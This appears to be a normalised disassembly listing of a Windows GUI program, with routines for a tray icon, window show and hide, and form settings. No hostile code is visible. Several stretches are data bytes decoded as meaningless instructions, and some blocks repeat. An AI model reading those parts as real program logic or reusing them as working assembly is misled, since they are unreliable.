xchg edx eax
inc eax
add [ eax ] al
xor [ esi ] bh
and [ esi ] bh
cmp bh [ edx ]
insb
jae r-xdata
mov es [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
xor [ esi ] bh
add ah ah
cmp bh [ edx ]
insb
jae r-xdata
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x20 ]
call sub_48d5f8
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x24 ]
call sub_48d62c
mov ecx [ rw-data ]
mov eax [ ebx + 0x3d0 ]
mov edx [ ecx + 0x28 ]
call sub_48d5f8
mov ecx [ ebx + 0x3dc ]
xor edx edx
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x2c ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x1
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x30 ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x2
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x34 ]
call sub_4a71a8
mov eax ebx
call sub_40a024
mov ecx [ rw-data ]
mov eax [ ecx ]
mov [ esp ] sub_4099e8
mov [ esp + 0x4 ] ebx
mov edx [ esp ]
mov [ eax + 0x148 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x14c ] edx
mov [ esp + 0x8 ] sub_409a78
mov [ esp + 0xc ] ebx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x150 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x154 ] ecx
xor edx edx
mov eax ebx
call sub_4098cc
call sub_40f690
mov eax ebx
call sub_409ba0
xor edx edx
mov eax [ ebx + 0x3d0 ]
call sub_4a6090
add esp 0x10
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f604
cmp esi eax
jge r-xdata
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x18 ]
call sub_47ea50
mov edx [ rw-data ]
mov eax [ ebx + 0x38c ]
mov dl [ edx + 0xe ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x438 ]
mov dl [ ecx + 0xf ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x4a0 ]
mov dl [ ecx + 0x3c ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x49c ]
mov dl [ ecx + 0x3d ]
call sub_465f5c
mov ecx [ rw-data ]
mov esi [ ecx + 0x18 ]
test esi esi
jl r-xdata
mov ecx rw-data
call sub_40e3f8
mov eax [ rw-data ]
push 0x10
cmp bh [ edx ]
push ebp
cmp bh [ edx ]
push ebp
outsb
insd
add [ eax ] al
add [ eax ] al
cmp al 0x53
jns r-xdata
add [ eax ] al
cmp al 0x53
jns r-xdata
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x1c ]
call sub_47ea14
add [ eax ] al
add [ eax ] dl
add [ eax ] al
je r-xdata
in al dx
sub [ rw-data ] 0x1
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
pop ebp
retn
pop ebp
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
add [ ebx ] al
outsb
sub al 0x73
je r-xdata
jb r-xdata
add [ ecx ] al
outsb
sub al 0x73
je r-xdata
add [ eax ] ah
add bh bh
cmp bh [ edx ]
popad
insb
insb
cmp bh [ edx ]
popad
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
outsd
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
jae r-xdata
pop eax
dec esi
add [ eax ] al
cmp bh [ fs : edx ]
jo r-xdata
jb r-xdata
imul esi [ edx + 0x3c ] 0x736e6f63
je r-xdata
pop ebp
retn
pop ebp
retn
sub_40929f
inc [ 0xffffffffc0000000 ]
add al dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
push esp
insd
popad
jo r-xdata
cmp dh [ eax + 0x61 ]
je r-xdata
and [ gs : edx ] ch
and [ esi ] bh
sub al 0x30
add ah ah
push ebx
jns r-xdata
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x74737953
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
dec esi
add [ edx + 0x10 ] ch
je r-xdata
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ rw-data ]
mov eax [ edx ]
call sub_4825dc
mov cl [ ebp ]
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
sub al 0x73
je r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + 0x1c ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f5f8
add eax 0xffffffe0
cmp esi eax
jge r-xdata
test al al
jne r-xdata
insd
cmp bh [ edx ]
push ebp
mov es [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
xor [ esi ] bh
add ah ah
cmp bh [ edx ]
insb
jae r-xdata
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x20 ]
call sub_48d5f8
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x24 ]
call sub_48d62c
mov ecx [ rw-data ]
mov eax [ ebx + 0x3d0 ]
mov edx [ ecx + 0x28 ]
call sub_48d5f8
mov ecx [ ebx + 0x3dc ]
xor edx edx
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x2c ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x1
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x30 ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x2
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x34 ]
call sub_4a71a8
mov eax ebx
call sub_40a024
mov ecx [ rw-data ]
mov eax [ ecx ]
mov [ esp ] sub_4099e8
mov [ esp + 0x4 ] ebx
mov edx [ esp ]
mov [ eax + 0x148 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x14c ] edx
mov [ esp + 0x8 ] sub_409a78
mov [ esp + 0xc ] ebx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x150 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x154 ] ecx
xor edx edx
mov eax ebx
call sub_4098cc
call sub_40f690
mov eax ebx
call sub_409ba0
xor edx edx
mov eax [ ebx + 0x3d0 ]
call sub_4a6090
add esp 0x10
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f604
cmp esi eax
jge r-xdata
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x18 ]
call sub_47ea50
mov edx [ rw-data ]
mov eax [ ebx + 0x38c ]
mov dl [ edx + 0xe ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x438 ]
mov dl [ ecx + 0xf ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x4a0 ]
mov dl [ ecx + 0x3c ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x49c ]
mov dl [ ecx + 0x3d ]
call sub_465f5c
mov ecx [ rw-data ]
mov esi [ ecx + 0x18 ]
test esi esi
jl r-xdata
mov ecx rw-data
call sub_40e3f8
mov eax [ rw-data ]
push 0x10
add [ eax ] al
cmp al 0x53
jns r-xdata
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x1c ]
call sub_47ea14
in al dx
sub [ rw-data ] 0x1
je r-xdata
pop ebp
retn
pop ebp
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
jb r-xdata
add [ ecx ] al
outsb
sub al 0x73
je r-xdata
cmp bh [ edx ]
popad
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
outsd
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
jae r-xdata
pop eax
dec esi
add [ eax ] al
cmp bh [ fs : edx ]
jo r-xdata
jb r-xdata
imul esi [ edx + 0x3c ] 0x736e6f63
je r-xdata
pop ebp
retn
pop ebp
retn
sub_409388
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
call sub_40e1ec
test al al
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebx + 0x38c ]
mov dl [ edx + 0xe ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x438 ]
mov dl [ ecx + 0xf ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x4a0 ]
mov dl [ ecx + 0x3c ]
call sub_465f5c
mov ecx [ rw-data ]
mov eax [ ebx + 0x49c ]
mov dl [ ecx + 0x3d ]
call sub_465f5c
mov ecx [ rw-data ]
mov esi [ ecx + 0x18 ]
test esi esi
jl r-xdata
call sub_40e3f8
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ rw-data ]
mov eax [ edx ]
call sub_4825dc
mov ecx [ rw-data ]
mov esi [ ecx + 0x1c ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f5f8
add eax 0xffffffe0
cmp esi eax
jge r-xdata
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x20 ]
call sub_48d5f8
mov ecx [ rw-data ]
mov eax ebx
mov edx [ ecx + 0x24 ]
call sub_48d62c
mov ecx [ rw-data ]
mov eax [ ebx + 0x3d0 ]
mov edx [ ecx + 0x28 ]
call sub_48d5f8
mov ecx [ ebx + 0x3dc ]
xor edx edx
mov eax [ ecx + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x2c ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x1
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x30 ]
call sub_4a71a8
mov eax [ ebx + 0x3dc ]
mov edx 0x2
mov eax [ eax + 0x29c ]
call sub_4a734c
mov ecx [ rw-data ]
mov edx [ ecx + 0x34 ]
call sub_4a71a8
mov eax ebx
call sub_40a024
mov ecx [ rw-data ]
mov eax [ ecx ]
mov [ esp ] sub_4099e8
mov [ esp + 0x4 ] ebx
mov edx [ esp ]
mov [ eax + 0x148 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x14c ] edx
mov [ esp + 0x8 ] sub_409a78
mov [ esp + 0xc ] ebx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x150 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x154 ] ecx
xor edx edx
mov eax ebx
call sub_4098cc
call sub_40f690
mov eax ebx
call sub_409ba0
xor edx edx
mov eax [ ebx + 0x3d0 ]
call sub_4a6090
add esp 0x10
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f604
cmp esi eax
jge r-xdata
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x18 ]
call sub_47ea50
mov edx [ rw-data ]
mov eax ebx
mov edx [ edx + 0x1c ]
call sub_47ea14
sub_409584
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
call sub_40f794
mov edx 0x2
mov eax ebx
call sub_4098cc
mov edx [ ebx + 0x38c ]
mov eax [ rw-data ]
mov cl [ edx + 0x34 ]
mov [ eax + 0xe ] cl
mov edx [ ebx + 0x438 ]
mov cl [ edx + 0x34 ]
mov [ eax + 0xf ] cl
mov edx [ ebx + 0x4a0 ]
mov cl [ edx + 0x34 ]
mov [ eax + 0x3c ] cl
mov edx [ ebx + 0x49c ]
mov cl [ edx + 0x34 ]
mov [ eax + 0x3d ] cl
mov eax ebx
call sub_479188
mov edx [ rw-data ]
mov [ edx + 0x18 ] eax
mov eax ebx
call sub_479168
mov esi [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x48 ]
mov [ esi + 0x20 ] eax
mov edx [ ebx + 0x4c ]
mov [ esi + 0x24 ] edx
mov ecx [ ebx + 0x3d0 ]
mov eax [ ecx + 0x48 ]
mov [ esi + 0x28 ] eax
mov edx [ ebx + 0x3dc ]
mov eax [ edx + 0x29c ]
xor edx edx
call sub_4a734c
call sub_4a7128
mov ecx [ rw-data ]
mov edx 0x1
mov [ ecx + 0x2c ] eax
mov eax [ ebx + 0x3dc ]
mov eax [ eax + 0x29c ]
call sub_4a734c
call sub_4a7128
mov ecx [ rw-data ]
mov edx 0x2
mov [ ecx + 0x30 ] eax
mov eax [ ebx + 0x3dc ]
mov eax [ eax + 0x29c ]
call sub_4a734c
call sub_4a7128
mov ecx [ rw-data ]
mov [ ecx + 0x34 ] eax
call sub_40e3f8
mov eax [ rw-data ]
call sub_405a7c
mov edx [ rw-data ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ rw-data ] edx
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0x24
push 0x3
mov eax [ ebp - 0x4 ]
push eax
call sub_404758
mov [ ebp - 0x18 ] 0xc
add esp 0x8
sub_4096d0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov dl [ ebx + 0x4b8 ]
test dl dl
jne r-xdata
mov [ ebp - 0x1c ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov eax [ edx ]
push eax
push rw-data
push 0x75
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ esi ] 0x1
jmp r-xdata
mov ecx [ ebx + 0x438 ]
mov al [ ecx + 0x34 ]
test al al
jne r-xdata
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x78
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
mov [ esi ] 0x0
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481adc
sub_4097b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x4b8 ] 0x1
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x82
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov eax ebx
call sub_47dde4
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409840
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ edx + 0x8 ]
sub eax 0x202
je r-xdata
mov edx [ rw-data ]
mov eax [ edx ]
mov dl [ eax + 0x57 ]
test dl dl
je r-xdata
sub eax 0x3
je r-xdata
mov edx ebx
mov eax ebx
call sub_409958
call sub_481adc
jmp r-xdata
push esp
call GetCursorPos
test eax eax
je r-xdata
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_481be0
jmp r-xdata
mov eax ebx
call sub_40a1d0
mov edx [ ebx + 0x3a0 ]
mov ecx [ _MainForm ]
mov [ edx + 0x64 ] ecx
mov eax ebx
call sub_496868
push eax
call SetForegroundWindow
mov eax [ ebx + 0x3a0 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
jmp r-xdata
sub_4098cc
push ebx
push esi
add esp 0xfffffe04
mov ebx eax
mov eax ebx
mov esi edx
mov [ esp ] 0x1fc
call sub_496868
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x3ee
mov [ esp + 0xc ] 0x7
mov [ esp + 0x10 ] 0x8064
test esi esi
jne r-xdata
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] 0x0
mov edx [ rw-data ]
mov ecx [ edx ]
mov eax [ ecx + 0x9c ]
call sub_4730f4
mov [ esp + 0x14 ] eax
push 0x80
push rw-data
lea edx [ esp + 0x20 ]
push edx
call lstrcpynA
jmp r-xdata
push esp
push esi
call Shell_NotifyIconA
test eax eax
setne al
and eax 0x1
add esp 0x1fc
pop esi
pop ebx
retn
sub_409958
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0xba
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481be0
mov edx [ rw-data ]
mov ecx [ edx ]
mov [ ecx + 0x57 ] 0x1
mov eax [ _MainForm ]
call sub_47df8c
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4099e8
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0xc7
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
push 0x0
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x170 ]
push edx
call ShowWindow
mov ecx [ rw-data ]
mov eax [ ecx ]
mov [ eax + 0x57 ] 0x0
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_409a78
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0xce
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
push 0x5
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x170 ]
push edx
call ShowWindow
mov eax ebx
call sub_496868
push eax
call SetForegroundWindow
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_409b0c
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0xd5
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481be0
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_409ba0
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x3c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0xc
mov edx [ ebx + 0x470 ]
mov cl [ edx + 0x34 ]
test cl cl
je r-xdata
mov ecx [ rw-data ]
mov al [ ecx + 0xc ]
test al al
jne r-xdata
mov [ ebp - 0x3c ] 0x24
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x30 ]
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4d31c8
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
xor edx edx
mov eax [ ebx + 0x424 ]
call sub_465fb0
xor edx edx
mov eax [ ebx + 0x434 ]
call sub_465fb0
xor edx edx
mov eax [ ebx + 0x428 ]
call sub_465fb0
mov [ ebp - 0x3c ] 0x30
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0x18 ] ecx
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_4d31c8
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov [ ebp - 0x3c ] 0x3c
mov esi [ ebx + 0x44c ]
mov eax [ ebx + 0x44c ]
add esi 0x270
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x30 ]
mov eax [ esi ]
mov esi [ eax ]
call [ esi + 0xc ]
lea eax [ ebp - 0x24 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0x20 ] ecx
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
call sub_4d31c8
lea eax [ ebp - 0x20 ]
xor edx edx
mov [ ebp - 0x28 ] edx
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x30 ]
pop edx
call sub_4d31c8
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48dfa0
mov [ ebp - 0x3c ] 0x48
xor eax eax
mov esi rw-data
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0xc
mov edx [ rw-data ]
push edx
push esi
push ecx
call sub_4d3324
add esp 0xc
mov edx [ eax ]
mov eax [ ebx + 0x3ec ]
call sub_48dfa0
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x4c ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409df4
push ebx
mov ebx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x4 ]
push edx
push eax
call sub_411e00
add esp 0x8
mov ecx [ ebx + 0x8 ]
push ecx
mov eax [ rw-data ]
push eax
call sub_411dbc
add esp 0x8
sub_409e4c
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
mov ebx edx
push esi
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
movsx esi [ ebx + 0x8 ]
add esi rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx esi
call sub_4d25d8
inc [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ eax ]
push edx
push rw-data
push 0x121
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov cl [ ebx + 0x8 ]
push ecx
mov eax [ rw-data ]
push eax
call sub_41344c
add esp 0x8
test eax eax
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
sub_409ef4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx edx
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] 0x18
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x4 ]
mov ecx edx
xor edx edx
xchg ecx eax
xchg ecx edx
call sub_4d25d8
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
xor ecx ecx
mov [ ebp - 0x20 ] 0xc
mov [ ebp - 0x20 ] 0x24
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x8 ]
mov edx [ eax ]
push edx
push rw-data
push 0x12f
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x20 ] 0x30
xor ecx ecx
mov [ ebp - 0xc ] ecx
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
call sub_41e604
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x14 ]
mov eax [ ecx ]
push eax
mov edx [ rw-data ]
push edx
call sub_4132d0
add esp 0x8
test eax eax
setl cl
and ecx 0x1
lea eax [ ebp - 0xc ]
push ecx
mov edx 0x2
dec [ ebp - 0x14 ]
call sub_4d318c
pop ecx
test cl cl
je r-xdata
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
sub_40a024
push ebx
mov ebx eax
mov eax [ ebx + 0x44c ]
add eax 0x270
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x44c ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
call sub_40a44c
pop ebx
retn
